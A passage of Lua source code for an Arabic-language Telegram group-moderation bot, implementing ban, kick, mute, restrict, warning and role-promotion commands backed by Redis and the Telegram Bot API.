if Rank_Checking(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\nلا تستطيع  حظر : "..Get_Rank(result.sender_user_id_,msg.chat_id_).." ")
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,"لا توجد لدي صلاحية حظر المستخدمين") 
return false  
end
redis:sadd(bot_id.."Tshakex:Removal:User:Group"..msg.chat_id_, result.sender_user_id_)
KickGroup(result.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","تم حظره من المجموعه")  
end,nil)   
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end

if text == ("طرد") and msg.reply_to_message_id_ ~= 0 and Admin(msg) then
if redis:get(bot_id..'Tshakex:Lock:Ban:Group'..msg.chat_id_) and not Owner(msg) then
send(msg.chat_id_, msg.id_,'لقد تم تعطيل الحظر و الطرد من قبل المنشئين')
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"عذرآ البوت ليس ادمن") 
return false  
end
function FunctionStatus(arg, result)
if Rank_Checking(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\nلا تستطيع طرد : "..Get_Rank(result.sender_user_id_,msg.chat_id_).." ")
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,"لا توجد لدي صلاحية طرد المستخدمين") 
return false  
end
KickGroup(result.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","تم طرده من المجموعه")  
end,nil)   
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end

if text == ("الغاء الحظر") and tonumber(msg.reply_to_message_id_) ~= 0 and Admin(msg) then
function FunctionStatus(arg, result)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, "️لا يمكنك عمل هاذا الامر على البوت") 
return false 
end
redis:srem(bot_id.."Tshakex:Removal:User:Group"..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
Send_Options(msg,result.sender_user_id_,"reply","تم الغاء الحظره من هنا")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end

if text == ("كتم") and msg.reply_to_message_id_ ~= 0 and Admin(msg) then
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"عذرآ البوت ليس ادمن") 
return false  
end
function FunctionStatus(arg, result)
if Rank_Checking(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\nلا تستطيع كتم : "..Get_Rank(result.sender_user_id_,msg.chat_id_).."")
return false 
end     
redis:sadd(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","تم كتمه من هنا")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end

if text == ("الغاء الكتم") and tonumber(msg.reply_to_message_id_) ~= 0 and Admin(msg) then
function FunctionStatus(arg, result)
redis:srem(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","تم الغاء الكتمه من هنا")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end

if text == ("فك التقييد") and tonumber(msg.reply_to_message_id_) ~= 0 and Admin(msg) then
function FunctionStatus(arg, result)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"عذرآ البوت ليس ادمن") 
return false  
end
redis:srem(bot_id.."Tshakex:Silence:kid:User:Group"..msg.chat_id_,result.sender_user_id_)
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.sender_user_id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
Send_Options(msg,result.sender_user_id_,"reply","تم فك التقييده")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end
if text == "الساعه" then
local ramsesj20 = "\n الساعه الان : "..os.date("%I:%M%p")
send(msg.chat_id_, msg.id_,ramsesj20)
end

if text == "التاريخ" then
local ramsesj20 =  "\n التاريخ : "..os.date("%Y/%m/%d")
send(msg.chat_id_, msg.id_,ramsesj20)
end



if text == ("تقييد") and tonumber(msg.reply_to_message_id_) ~= 0 and Admin(msg) then
function FunctionStatus(arg, result)
if Rank_Checking(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\nلا تستطيع تقييد : "..Get_Rank(result.id_,msg.chat_id_).."")
return false 
end      
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"عذرآ البوت ليس ادمن") 
return false  
end
redis:sadd(bot_id.."Tshakex:Silence:kid:User:Group"..msg.chat_id_,result.sender_user_id_)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","تم تقييده")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end

if text and text:match("^حظر عام @(.*)$") and DeveloperBot1(msg) then
function FunctionStatus(arg, result)
if (result.id_) then
if result and result.type_ and result.type_.ID == ("ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"عذرا هاذا معرف قناة")   
return false 
end      
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "لا تسطيع حظر البوت عام")
return false 
end 
if Dev_Bots_User(result.id_) == true then
send(msg.chat_id_, msg.id_, "لا تستطيع حظر المطور الاساسي عام")
return false 
end
if DeveloperBot12(result.id_) == true then
send(msg.chat_id_, msg.id_, "لا تستطيع حظر المطور الاساسي عام")
return false 
end
redis:sadd(bot_id.."Tshakex:Removal:User:Groups", result.id_)
Send_Options(msg,result.id_,"reply","تم حظره عام من المجموعات")  
else
send(msg.chat_id_, msg.id_,"المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^حظر عام @(.*)$")}, FunctionStatus, nil)
end

if text and text:match("^الغاء العام @(.*)$") and DeveloperBot1(msg) then
function FunctionStatus(arg, result)
if (result.id_) then
Send_Options(msg,result.id_,"reply","تم الغاء الحظره عام من المجموعات")  
redis:srem(bot_id.."Tshakex:Removal:User:Groups", result.id_)
else
send(msg.chat_id_, msg.id_,"المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^الغاء العام @(.*)$") }, FunctionStatus, nil)
end

if text and text:match("^كتم عام @(.*)$") and DeveloperBot1(msg) then
function FunctionStatus(arg, result)
if (result.id_) then
if result and result.type_ and result.type_.ID == ("ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"عذرا هاذا معرف قناة")   
return false 
end      
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "لا تسطيع كتم البوت عام")
return false 
end
if Dev_Bots_User(result.id_) == true then
send(msg.chat_id_, msg.id_, "لا تستطيع كتم المطور الاساسي عام")
return false 
end
if DeveloperBot12(result.id_) == true then
send(msg.chat_id_, msg.id_, "لا تستطيع كتم المطور الاساسي عام")
return false 
end
redis:sadd(bot_id.."Tshakex:Silence:User:Groups", result.id_)
Send_Options(msg,result.id_,"reply","تم كتمه عام من المجموعات")  
else
send(msg.chat_id_, msg.id_,"المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^كتم عام @(.*)$")}, FunctionStatus, nil)
end

if text and text:match("^الغاء الكتم العام @(.*)$") and DeveloperBot1(msg) then
function FunctionStatus(arg, result)
if (result.id_) then
Send_Options(msg,result.id_,"reply","تم الغاء الكتمه عام من المجموعات")  
redis:srem(bot_id.."Tshakex:Silence:User:Groups", result.id_)
else
send(msg.chat_id_, msg.id_,"المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^الغاء الكتم العام @(.*)$") }, FunctionStatus, nil)
end
if text and text:match("^حظر @(.*)$") and Admin(msg) then
if redis:get(bot_id..'Tshakex:Lock:Ban:Group'..msg.chat_id_) and not Owner(msg) then
send(msg.chat_id_, msg.id_,'لقد تم تعطيل الحظر و الطرد من قبل المنشئين')
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"عذرآ البوت ليس ادمن") 
return false  
end
function FunctionStatus(arg, result)
if (result.id_) then
if Rank_Checking(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\nلا تستطيع  حظر : "..Get_Rank(result.id_,msg.chat_id_).."")
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"عذرا هاذا معرف قناة")   
return false 
end      
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,"لا توجد لدي صلاحية حظر المستخدمين") 
return false  
end
redis:sadd(bot_id.."Tshakex:Removal:User:Group"..msg.chat_id_, result.id_)
KickGroup(msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","تم حظره من المجموعه")  
end,nil)   
end
else
send(msg.chat_id_, msg.id_,"المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^حظر @(.*)$")}, FunctionStatus, nil)
end

if text and text:match("^الغاء الحظر @(.*)$") and Admin(msg) then
function FunctionStatus(arg, result)
if (result.id_) then
if tonumber(result.id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, "️لا يمكنك عمل هاذا الامر على البوت") 
return false 
end
redis:srem(bot_id.."Tshakex:Removal:User:Group"..msg.chat_id_, result.id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
Send_Options(msg,result.id_,"reply","تم الغاء الحظره من هنا")  
else
send(msg.chat_id_, msg.id_,"المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^الغاء الحظر @(.*)$") }, FunctionStatus, nil)
end
if text and text:match("^انذار @(.*)$") and Admin(msg) and not redis:get(bot_id..'Tshakex:inthar:group'..msg.chat_id_) then
function FunctionStatus(arg, result)
if (result.id_) then
if Rank_Checking(result.id_, msg.chat_id_) == true then
return send(msg.chat_id_, msg.id_, "\nلا تستطيع انذار: "..Get_Rank(result.id_,msg.chat_id_).." ")
end
local numinthar = tonumber(redis:get(bot_id.."Tshakex:inthar"..msg.chat_id_..result.id_) or 0)
if numinthar == 0 then
redis:set(bot_id.."Tshakex:inthar"..msg.chat_id_..result.id_,'1')
Send_Options(msg,result.id_,"reply","تم اعطائه انذار \n تبقى له انذارين ويتم كتمه")  
elseif numinthar == 1 then
Send_Options(msg,result.id_,"reply","تم اعطائه انذار \n تبقى له انذار و يتم كتمه")  
redis:set(bot_id.."Tshakex:inthar"..msg.chat_id_..result.id_,'2')
elseif numinthar == 2 then
Send_Options(msg,result.id_,"reply","تم كتمه \n لانه تجاوز حد 3 انذارات")  
redis:del(bot_id.."Tshakex:inthar"..msg.chat_id_..result.id_)
redis:sadd(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_, result.id_)
end
else
send(msg.chat_id_, msg.id_,"المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^انذار @(.*)$") }, FunctionStatus, nil)
end
if text == ("انذار") and tonumber(msg.reply_to_message_id_) ~= 0 and Admin(msg) and not redis:get(bot_id..'Tshakex:inthar:group'..msg.chat_id_) then
function FunctionStatus(arg, result)
if Rank_Checking(result.sender_user_id_, msg.chat_id_) == true then
return send(msg.chat_id_, msg.id_, "\nلا تستطيع انذار: "..Get_Rank(result.sender_user_id_,msg.chat_id_).." ")
end
local numinthar = tonumber(redis:get(bot_id.."Tshakex:inthar"..msg.chat_id_..result.sender_user_id_) or 0)
if numinthar == 0 then
redis:set(bot_id.."Tshakex:inthar"..msg.chat_id_..result.sender_user_id_,'1')
Send_Options(msg,result.id_,"reply","تم اعطائه انذار \n تبقى له انذارين ويتم كتمه")  
elseif numinthar == 1 then
Send_Options(msg,result.id_,"reply","تم اعطائه انذار \n تبقى له انذار و يتم كتمه")  
redis:set(bot_id.."Tshakex:inthar"..msg.chat_id_..result.sender_user_id_,'2')
elseif numinthar == 2 then
Send_Options(msg,result.id_,"reply","تم كتمه \n لانه تجاوز حد 3 انذارات")  
redis:del(bot_id.."Tshakex:inthar"..msg.chat_id_..result.sender_user_id_)
redis:sadd(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_, result.sender_user_id_)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end
if text == 'تفعيل الانذار' and Admin(msg) then   
redis:del(bot_id..'Tshakex:inthar:group'..msg.chat_id_) 
Text = '\n تم تفعيل الانذارات' 
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الانذار' and Admin(msg) then  
redis:set(bot_id..'Tshakex:inthar:group'..msg.chat_id_,true) 
Text = '\nتم تعطيل الانذارات' 
send(msg.chat_id_, msg.id_,Text) 
end 
if text == 'تفعيل تحقق' and Admin(msg) then   
redis:del(bot_id..'Tshakex:nwe:mem:group'..msg.chat_id_) 
Text = '\n تم تفعيل تحقق' 
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل تحقق' and Admin(msg) then  
redis:set(bot_id..'Tshakex:nwe:mem:group'..msg.chat_id_,true) 
Text = '\nتم تعطيل تحقق' 
send(msg.chat_id_, msg.id_,Text) 
end 
if text and text:match("^كتم @(.*)$") and Admin(msg) then
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"عذرآ البوت ليس ادمن") 
return false  
end
function FunctionStatus(arg, result)
if (result.id_) then
if Rank_Checking(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\nلا تستطيع كتم : "..Get_Rank(result.id_,msg.chat_id_).." ")
return false 
end     
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"عذرا هاذا معرف قناة")   
return false 
end      
redis:sadd(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","تم كتمه من هنا")  
else
send(msg.chat_id_, msg.id_,"المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^كتم @(.*)$")}, FunctionStatus, nil)
end

if text and text:match("^الغاء الكتم @(.*)$") and Admin(msg) then
function FunctionStatus(arg, result)
if (result.id_) then
redis:srem(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","تم الغاء الكتمه من هنا")  
else
send(msg.chat_id_, msg.id_,"المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^الغاء الكتم @(.*)$")}, FunctionStatus, nil)
end
if text == ("المقيدين") and Admin(msg) then
local list = redis:smembers(bot_id.."Tshakex:Silence:kid:User:Group"..msg.chat_id_)
if #list == 0 then
return send(msg.chat_id_, msg.id_, "• لا يوجد مقيدين")
end
selint = "\n• قائمة المقيدين في المجموعه \n━━━━━━━━\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
selint = selint..""..k.."~ : "..username.."\n"
if #list == k then
return send(msg.chat_id_, msg.id_, selint)
end
end,nil)
end
end
if text and text:match("^تقييد @(.*)$") and Admin(msg) then
function FunctionStatus(arg, result)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"عذرآ البوت ليس ادمن") 
return false  
end
if (result.id_) then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"عذرا هاذا معرف قناة")   
return false 
end      
if Rank_Checking(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\nلا تستطيع تقييد : "..Get_Rank(result.id_,msg.chat_id_).."")
return false 
end      
redis:sadd(bot_id.."Tshakex:Silence:kid:User:Group"..msg.chat_id_,result.id_)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_)
Send_Options(msg,result.id_,"reply","تم تقييده في المجموعه")  
else
send(msg.chat_id_, msg.id_,"المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^تقييد @(.*)$")}, FunctionStatus, nil)
end

if text and text:match("^فك التقييد @(.*)$") and Admin(msg) then
function FunctionStatus(arg, result)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"عذرآ البوت ليس ادمن") 
return false  
end
if (result.id_) then
redis:srem(bot_id.."Tshakex:Silence:kid:User:Group"..msg.chat_id_,result.id_)
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
Send_Options(msg,result.id_,"reply","تم فك التقييده")  
else
send(msg.chat_id_, msg.id_,"المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^فك التقييد @(.*)$")}, FunctionStatus, nil)
end


if text and text:match("^تقييد عام @(.*)$") and DeveloperBot1(msg) then
function FunctionStatus(arg, result)
if (result.id_) then
if result and result.type_ and result.type_.ID == ("ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"عذرا هاذا معرف قناة")   
return false 
end      
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "لا تسطيع تقييد البوت عام")
return false 
end
if Dev_Bots_User(result.id_) == true then
send(msg.chat_id_, msg.id_, " المطور الاساسي لا تستطيع تقييد عام")
return false 
end
redis:sadd(bot_id.."Tshakex:Removalked:User:Groups", result.id_)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_)
Send_Options(msg,result.id_,"reply","تم تقييده عام من المجموعات")  
else
send(msg.chat_id_, msg.id_,"المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^تقييد عام @(.*)$")}, FunctionStatus, nil)
end

if text and text:match("^الغاء تقييد عام @(.*)$") and DeveloperBot1(msg) then
function FunctionStatus(arg, result)
if (result.id_) then
Send_Options(msg,result.id_,"reply","تم الغاء تقييده عام من المجموعات")  
redis:srem(bot_id.."Tshakex:Removalked:User:Groups", result.id_)
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
else
send(msg.chat_id_, msg.id_,"المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^الغاء تقييد عام @(.*)$") }, FunctionStatus, nil)
end

if text == ("تقييد عام") and tonumber(msg.reply_to_message_id_) ~= 0 and DeveloperBot1(msg) then
function FunctionStatus(arg, result)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "لا تسطيع تقييد البوت عام")
return false 
end
if Dev_Bots_User(result.sender_user_id_) == true then
send(msg.chat_id_, msg.id_, " المطور الاساسي لا تستطيع تقييد عام")
return false 
end
Send_Options(msg,result.sender_user_id_,"reply","تم تقييده عام من المجموعات")  
redis:sadd(bot_id.."Tshakex:Removalked:User:Groups", result.sender_user_id_)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end

if text == ("الغاء تقييد عام") and tonumber(msg.reply_to_message_id_) ~= 0 and DeveloperBot1(msg) then
function FunctionStatus(arg, result)
redis:srem(bot_id.."Tshakex:Removalked:User:Groups", result.sender_user_id_)
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.sender_user_id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
Send_Options(msg,result.sender_user_id_,"reply","تم الغاء تقييده عام من المجموعات")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end
if text == ("المقيدين عام") and DeveloperBot1(msg) then
local list = redis:smembers(bot_id.."Tshakex:Removalked:User:Groups")
if #list == 0 then
return send(msg.chat_id_, msg.id_,"• لا يوجد مقيدين عام")
end
Gban = "\n• قائمة المقيدين عام في البوت\n━━━━━━━━━━━━━\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
Gban = Gban..""..k.."~ : "..username.."\n"
if #list == k then
return send(msg.chat_id_, msg.id_, Gban)
end
end,nil)
end
end

if text and text:match("^طرد @(.*)$") and Admin(msg) then
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"عذرآ البوت ليس ادمن") 
return false  
end
if not redis:get(bot_id..'Tshakex:Cheking:Seted'..msg.chat_id_) and not Owner(msg) then
send(msg.chat_id_, msg.id_,'لقد تم تعطيل الحظر و الطرد من قبل المنشئين')
return false
end
function FunctionStatus(arg, result)
if (result.id_) then
if Rank_Checking(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\nلا تستطيع  حظر , طرد , كتم , تقييد : "..Get_Rank(result.id_,msg.chat_id_).."")
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"عذرا هاذا معرف قناة")   
return false 
end      
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,"لا توجد لدي صلاحية حظر المستخدمين") 
return false  
end
KickGroup(msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","تم طرده من هنا")  
end,nil)   
end
else
send(msg.chat_id_, msg.id_,"المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^طرد @(.*)$")}, FunctionStatus, nil)
end

if text == ("رفع مطور") and tonumber(msg.reply_to_message_id_) ~= 0 and Dev_Bots(msg) then
function FunctionStatus(arg, result)
redis:sadd(bot_id.."Tshakex:Developer:Bot", result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","تم ترقيته مطور في البوت")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end

if text == ("تنزيل مطور") and tonumber(msg.reply_to_message_id_) ~= 0 and Dev_Bots(msg) then
function FunctionStatus(arg, result)
redis:srem(bot_id.."Tshakex:Developer:Bot", result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","تم تنزيله من المطورين")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end

if text == ("رفع مطور ثانوي") and tonumber(msg.reply_to_message_id_) ~= 0 and Dev_Bots(msg) then
function FunctionStatus(arg, result)
redis:sadd(bot_id.."Tshakex:Developer:Bot1", result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","تم ترقيته مطور ثانوي في البوت")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end

if text == ("تنزيل مطور ثانوي") and tonumber(msg.reply_to_message_id_) ~= 0 and Dev_Bots(msg) then
function FunctionStatus(arg, result)
redis:srem(bot_id.."Tshakex:Developer:Bot1", result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","تم تنزيله من المطور الثانوي")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end


if text == ("رفع منشئ اساسي") and tonumber(msg.reply_to_message_id_) ~= 0 and DeveloperBot(msg) then
function FunctionStatus(arg, result)
redis:sadd(bot_id.."Tshakex:President:Group"..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","تم ترقيته منشئ اساسي")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
return false
end

if text == ("تنزيل منشئ اساسي") and tonumber(msg.reply_to_message_id_) ~= 0 and DeveloperBot(msg) then
function FunctionStatus(arg, result)
redis:srem(bot_id.."Tshakex:President:Group"..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","تم تنزيله من المنشئين")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
return false
end

if text == ("رفع منشئ اساسي") and tonumber(msg.reply_to_message_id_) ~= 0 then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
function FunctionStatus(arg, result)
redis:sadd(bot_id.."Tshakex:President:Group"..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","تم ترقيته منشئ اساسي")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end
end,nil)
return false
end

if text == ("تنزيل منشئ اساسي") and tonumber(msg.reply_to_message_id_) ~= 0 then 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
function FunctionStatus(arg, result)
redis:srem(bot_id.."Tshakex:President:Group"..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","تم تنزيله من المنشئين")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end
end,nil)
return false
end

if text == "رفع منشئ" and tonumber(msg.reply_to_message_id_) ~= 0 and PresidentGroup(msg) then
function FunctionStatus(arg, result)
redis:sadd(bot_id.."Tshakex:Constructor:Group"..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","تم ترقيته منشئ في المجموعه")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end

if text and text:match("^تنزيل منشئ$") and tonumber(msg.reply_to_message_id_) ~= 0 and PresidentGroup(msg) then
function FunctionStatus(arg, result)
redis:srem(bot_id.."Tshakex:Constructor:Group"..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","تم تنزيله من المنشئين")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end

if text == ("رفع مدير") and tonumber(msg.reply_to_message_id_) ~= 0 and Constructor(msg) then
function FunctionStatus(arg, result)
redis:sadd(bot_id.."Tshakex:Manager:Group"..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","تم ترقيته مدير المجموعه")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end

if text == ("تنزيل مدير") and tonumber(msg.reply_to_message_id_) ~= 0 and Constructor(msg) then
function FunctionStatus(arg, result)
redis:srem(bot_id.."Tshakex:Manager:Group"..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","تم تنزيله من المدراء")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end

if text == ("رفع ادمن") and tonumber(msg.reply_to_message_id_) ~= 0 and Owner(msg) then
